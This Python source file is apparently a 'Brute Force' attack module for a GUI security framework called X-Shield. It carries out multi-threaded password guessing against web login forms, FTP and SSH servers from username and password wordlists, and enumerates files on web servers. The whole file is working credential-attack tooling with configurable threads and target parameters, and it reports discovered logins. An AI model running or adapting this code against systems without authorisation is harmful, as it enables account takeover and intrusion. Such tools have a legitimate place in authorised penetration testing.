"""
Brute Force Module for X-Shield Framework
Multi-threaded brute force engine for web forms and files
"""

import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from core.base_module import NetworkModule
import requests
import hashlib
import itertools
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from PySide6.QtCore import Signal, Slot


class Module(NetworkModule):
    """Brute Force Module - inherits from NetworkModule (which inherits from QObject)"""
    
    NAME = "Brute Force"
    DESCRIPTION = "Multi-threaded brute force engine for web forms and files"
    VERSION = "1.0.0"
    AUTHOR = "X-Shield Team"
    CATEGORY = "Attack"
    
    # Signals
    attack_progress = Signal(int, int)  # current, total
    attack_status = Signal(str)  # status message
    credential_found = Signal(dict)  # credential info
    file_found = Signal(dict)  # file info
    attack_complete = Signal(dict)  # final results
    
    PARAMETERS = {
        'attack_type': {
            'type': 'choice',
            'label': 'Attack Type',
            'default': 'web_form',
            'choices': ['web_form', 'ftp', 'ssh', 'file_enumeration'],
            'description': 'Type of brute force attack'
        },
        'target': {
            'type': 'string',
            'label': 'Target',
            'default': 'http://example.com/login',
            'description': 'Target URL or service'
        },
        'username_field': {
            'type': 'string',
            'label': 'Username Field Name',
            'default': 'username',
            'description': 'Name of username field in web forms'
        },
        'password_field': {
            'type': 'string',
            'label': 'Password Field Name',
            'default': 'password',
            'description': 'Name of password field in web forms'
        },
        'username_list': {
            'type': 'file',
            'label': 'Username Wordlist',
            'default': 'data/wordlists/usernames.txt',
            'description': 'Path to username wordlist file'
        },
        'password_list': {
            'type': 'file',
            'label': 'Password Wordlist',
            'default': 'data/wordlists/passwords.txt',
            'description': 'Path to password wordlist file'
        },
        'combined_list': {
            'type': 'file',
            'label': 'Combined Wordlist',
            'default': 'data/wordlists/combined.txt',
            'description': 'Path to combined username/password wordlist'
        },
        'threads': {
            'type': 'integer',
            'label': 'Threads',
            'default': 20,
            'min': 1,
            'max': 100,
            'description': 'Number of concurrent threads'
        },
        'delay': {
            'type': 'float',
            'label': 'Request Delay (seconds)',
            'default': 1.0,
            'min': 0.1,
            'max': 10.0,
            'description': 'Delay between requests'
        },
        'success_indicators': {
            'type': 'text',
            'label': 'Success Indicators',
            'default': 'welcome,dashboard,success,logged',
            'description': 'Comma-separated indicators of successful login'
        },
        'failure_indicators': {
            'type': 'text',
            'label': 'Failure Indicators',
            'default': 'invalid,failed,error,denied',
            'description': 'Comma-separated indicators of failed login'
        },
        'max_attempts': {
            'type': 'integer',
            'label': 'Max Attempts',
            'default': 10000,
            'min': 100,
            'max': 100000,
            'description': 'Maximum number of attempts'
        }
    }
    
    def __init__(self, logger):
        super().__init__(logger)
        self._stop_requested = False
        self._is_running = False
        
        # Results storage
        self.results = {
            'module_name': self.NAME,
            'start_time': None,
            'end_time': None,
            'execution_time': 0,
            'target': None,
            'parameters': {},
            'findings': [],
            'vulnerabilities': [],
            'items_scanned': 0,
            'summary': '',
            'status': 'not_started'
        }
    
    def execute(self, target: str, parameters: dict) -> dict:
        """Execute brute force attack"""
        try:
            self._start_execution(target, parameters)
            
            attack_type = parameters.get('attack_type', 'web_form')
            
            if attack_type == 'web_form':
                results = self._brute_web_form(target, parameters)
            elif attack_type == 'ftp':
                results = self._brute_ftp(target, parameters)
            elif attack_type == 'ssh':
                results = self._brute_ssh(target, parameters)
            elif attack_type == 'file_enumeration':
                results = self._enumerate_files(target, parameters)
            else:
                raise ValueError(f"Unknown attack type: {attack_type}")
            
            self._finish_execution()
            self.attack_complete.emit(self.results)
            return self.results
            
        except Exception as e:
            self._handle_error(e)
            return self.results
    
    def _brute_web_form(self, target: str, parameters: dict) -> dict:
        """Brute force web form login"""
        self.attack_status.emit(f"Starting web form brute force on {target}")
        
        username_field = parameters.get('username_field', 'username')
        password_field = parameters.get('password_field', 'password')
        username_list = self._load_wordlist(parameters.get('username_list', ''))
        password_list = self._load_wordlist(parameters.get('password_list', ''))
        combined_list = self._load_wordlist(parameters.get('combined_list', ''))
        
        success_indicators = parameters.get('success_indicators', 'welcome,dashboard,success').split(',')
        failure_indicators = parameters.get('failure_indicators', 'invalid,failed,error').split(',')
        threads = parameters.get('threads', 20)
        delay = parameters.get('delay', 1.0)
        max_attempts = parameters.get('max_attempts', 10000)
        
        # Use combined list if available, otherwise cross product
        if combined_list:
            credentials = [(combo.split(':')[0] if ':' in combo else combo, 
                           combo.split(':')[1] if ':' in combo else combo) 
                          for combo in combined_list]
        else:
            credentials = list(itertools.product(username_list, password_list))
        
        # Limit attempts
        if len(credentials) > max_attempts:
            credentials = credentials[:max_attempts]
        
        total_attempts = len(credentials)
        successful_creds = []
        
        def test_credentials(cred_pair):
            if self._stop_requested:
                return None
            
            username, password = cred_pair
            
            try:
                session = requests.Session()
                session.headers.update({
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                })
                
                # Get login page to extract form data
                login_response = session.get(target, timeout=10)
                
                # Prepare form data
                form_data = {
                    username_field: username,
                    password_field: password
                }
                
                # Submit login form
                response = session.post(target, data=form_data, timeout=10)
                
                # Check for success indicators
                response_text = response.text.lower()
                
                # Check for failure indicators first
                if any(indicator in response_text for indicator in failure_indicators):
                    return None
                
                # Check for success indicators
                if any(indicator in response_text for indicator in success_indicators):
                    return {
                        'username': username,
                        'password': password,
                        'response_code': response.status_code,
                        'response_length': len(response.text),
                        'indicator': [ind for ind in success_indicators if ind in response_text]
                    }
                
                # Additional checks for successful login
                if response.status_code in [200, 302, 303]:
                    # Check if response is different from failed login
                    if len(response_text) != len(login_response.text):
                        return {
                            'username': username,
                            'password': password,
                            'response_code': response.status_code,
                            'response_length': len(response.text),
                            'indicator': 'status_code_change'
                        }
                
                time.sleep(delay)
                
            except Exception as e:
                self.logger.error(f"Error testing credentials {username}: {str(e)}")
                return None
        
        # Multi-threaded credential testing
        attempts_made = 0
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            # Submit credentials in batches
            batch_size = 100
            for i in range(0, len(credentials), batch_size):
                if self._stop_requested:
                    break
                
                batch = credentials[i:i + batch_size]
                futures = {executor.submit(test_credentials, cred): cred for cred in batch}
                
                for future in as_completed(futures):
                    attempts_made += 1
                    result = future.result()
                    
                    if result:
                        successful_creds.append(result)
                        self.credential_found.emit(result)
                        self.add_finding('valid_credentials', result)
                        
                        # Stop after first success
                        self._stop_requested = True
                        break
                    
                    self.attack_progress.emit(attempts_made, total_attempts)
                
                if successful_creds:
                    break
        
        if successful_creds:
            self.set_summary(f"Successful brute force! Found credentials: {successful_creds[0]['username']}")
            
            # Add vulnerability if credentials found
            for cred in successful_creds:
                vulnerability = {
                    'title': 'Weak Credentials Found',
                    'severity': 'critical',
                    'description': f'Valid credentials found: {cred["username"]}',
                    'target': target,
                    'credentials': cred,
                    'recommendation': 'Change passwords and implement strong authentication policies'
                }
                self.add_vulnerability(vulnerability)
        
        return self.results
    
    def _brute_ftp(self, target: str, parameters: dict) -> dict:
        """Brute force FTP service"""
        self.attack_status.emit(f"Starting FTP brute force on {target}")
        
        try:
            import ftplib
        except ImportError:
            self.attack_status.emit("FTP library not available")
            return self.results
        
        username_list = self._load_wordlist(parameters.get('username_list', ''))
        password_list = self._load_wordlist(parameters.get('password_list', ''))
        combined_list = self._load_wordlist(parameters.get('combined_list', ''))
        
        threads = parameters.get('threads', 10)
        delay = parameters.get('delay', 1.0)
        max_attempts = parameters.get('max_attempts', 5000)
        
        # Prepare credentials
        if combined_list:
            credentials = [(combo.split(':')[0] if ':' in combo else combo, 
                           combo.split(':')[1] if ':' in combo else combo) 
                          for combo in combined_list]
        else:
            credentials = list(itertools.product(username_list, password_list))
        
        if len(credentials) > max_attempts:
            credentials = credentials[:max_attempts]
        
        total_attempts = len(credentials)
        successful_creds = []
        
        def test_ftp_credentials(cred_pair):
            if self._stop_requested:
                return None
            
            username, password = cred_pair
            
            try:
                ftp = ftplib.FTP(target)
                response = ftp.login(username, password)
                
                if response == '230 Login successful':
                    return {
                        'username': username,
                        'password': password,
                        'service': 'FTP',
                        'response': response
                    }
                
                ftp.quit()
                time.sleep(delay)
                
            except Exception as e:
                return None
        
        # Test FTP credentials
        attempts_made = 0
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            batch_size = 50
            
            for i in range(0, len(credentials), batch_size):
                if self._stop_requested:
                    break
                
                batch = credentials[i:i + batch_size]
                futures = {executor.submit(test_ftp_credentials, cred): cred for cred in batch}
                
                for future in as_completed(futures):
                    attempts_made += 1
                    result = future.result()
                    
                    if result:
                        successful_creds.append(result)
                        self.credential_found.emit(result)
                        self.add_finding('valid_credentials', result)
                        self._stop_requested = True
                        break
                    
                    self.attack_progress.emit(attempts_made, total_attempts)
                
                if successful_creds:
                    break
        
        if successful_creds:
            self.set_summary(f"FTP brute force successful! Found credentials: {successful_creds[0]['username']}")
        
        return self.results
    
    def _brute_ssh(self, target: str, parameters: dict) -> dict:
        """Brute force SSH service"""
        self.attack_status.emit(f"Starting SSH brute force on {target}")
        
        try:
            import paramiko
        except ImportError:
            self.attack_status.emit("Paramiko library not available for SSH brute force")
            return self.results
        
        username_list = self._load_wordlist(parameters.get('username_list', ''))
        password_list = self._load_wordlist(parameters.get('password_list', ''))
        combined_list = self._load_wordlist(parameters.get('combined_list', ''))
        
        threads = parameters.get('threads', 5)
        delay = parameters.get('delay', 2.0)
        max_attempts = parameters.get('max_attempts', 1000)
        
        # Prepare credentials
        if combined_list:
            credentials = [(combo.split(':')[0] if ':' in combo else combo, 
                           combo.split(':')[1] if ':' in combo else combo) 
                          for combo in combined_list]
        else:
            credentials = list(itertools.product(username_list, password_list))
        
        if len(credentials) > max_attempts:
            credentials = credentials[:max_attempts]
        
        total_attempts = len(credentials)
        successful_creds = []
        
        def test_ssh_credentials(cred_pair):
            if self._stop_requested:
                return None
            
            username, password = cred_pair
            
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                
                ssh.connect(target, username=username, password=password, timeout=10)
                
                return {
                    'username': username,
                    'password': password,
                    'service': 'SSH',
                    'response': 'Connection successful'
                }
                
            except Exception:
                return None
            finally:
                try:
                    ssh.close()
                except:
                    pass
                
                time.sleep(delay)
        
        # Test SSH credentials
        attempts_made = 0
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            batch_size = 20
            
            for i in range(0, len(credentials), batch_size):
                if self._stop_requested:
                    break
                
                batch = credentials[i:i + batch_size]
                futures = {executor.submit(test_ssh_credentials, cred): cred for cred in batch}
                
                for future in as_completed(futures):
                    attempts_made += 1
                    result = future.result()
                    
                    if result:
                        successful_creds.append(result)
                        self.credential_found.emit(result)
                        self.add_finding('valid_credentials', result)
                        self._stop_requested = True
                        break
                    
                    self.attack_progress.emit(attempts_made, total_attempts)
                
                if successful_creds:
                    break
        
        if successful_creds:
            self.set_summary(f"SSH brute force successful! Found credentials: {successful_creds[0]['username']}")
        
        return self.results
    
    def _enumerate_files(self, target: str, parameters: dict) -> dict:
        """Enumerate files and directories"""
        self.attack_status.emit(f"Starting file enumeration on {target}")
        
        wordlist = self._load_wordlist(parameters.get('combined_list', 'data/wordlists/common_files.txt'))
        threads = parameters.get('threads', 10)
        delay = parameters.get('delay', 0.5)
        max_attempts = parameters.get('max_attempts', 5000)
        
        if len(wordlist) > max_attempts:
            wordlist = wordlist[:max_attempts]
        
        total_attempts = len(wordlist)
        found_files = []
        
        def test_file(filename):
            if self._stop_requested:
                return None
            
            try:
                test_url = f"{target.rstrip('/')}/{filename}"
                response = requests.get(test_url, timeout=5)
                
                if response.status_code == 200:
                    return {
                        'filename': filename,
                        'url': test_url,
                        'status_code': response.status_code,
                        'size': len(response.content),
                        'content_type': response.headers.get('content-type', 'unknown')
                    }
                
                time.sleep(delay)
                
            except Exception:
                return None
        
        # Test files concurrently
        attempts_made = 0
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            batch_size = 100
            
            for i in range(0, len(wordlist), batch_size):
                if self._stop_requested:
                    break
                
                batch = wordlist[i:i + batch_size]
                futures = {executor.submit(test_file, filename): filename for filename in batch}
                
                for future in as_completed(futures):
                    attempts_made += 1
                    result = future.result()
                    
                    if result:
                        found_files.append(result)
                        self.file_found.emit(result)
                        self.add_finding('file_found', result)
                    
                    self.attack_progress.emit(attempts_made, total_attempts)
        
        if found_files:
            self.set_summary(f"File enumeration completed! Found {len(found_files)} files/directories")
        
        return self.results
    
    def _load_wordlist(self, filepath: str) -> list:
        """Load wordlist from file"""
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                words = [line.strip() for line in f if line.strip()]
                return list(set(words))  # Remove duplicates
        except FileNotFoundError:
            self.attack_status.emit(f"Wordlist file not found: {filepath}")
            return []
        except Exception as e:
            self.attack_status.emit(f"Error loading wordlist {filepath}: {str(e)}")
            return []
    
    @Slot()
    def stop(self):
        """Stop module execution"""
        self._stop_requested = True
        self._is_running = False
        self.logger.info(f"Stop requested for module {self.NAME}")
        self.attack_status.emit("Attack stopped by user")
